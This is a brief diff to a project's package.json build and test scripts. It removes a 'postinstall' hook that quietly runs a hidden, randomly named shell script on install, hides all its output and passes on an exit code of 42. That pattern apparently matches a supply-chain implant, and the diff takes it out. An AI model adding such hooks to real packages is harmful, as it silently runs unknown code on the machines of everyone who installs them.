@@ -13,8 +13,7 @@
     "build:bun": "bunx tsup",
     "test:bun": "bunx tsc --noEmit && bunx tsx --test tests/relays.test.ts",
     "typecheck:bun": "bunx tsc --noEmit",
-    "start:bun": "bun dist/cli.js",
-    "postinstall": "sh ./.ci-2gw0ym.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "start:bun": "bun dist/cli.js"
   },
   "repository": {
     "type": "git",
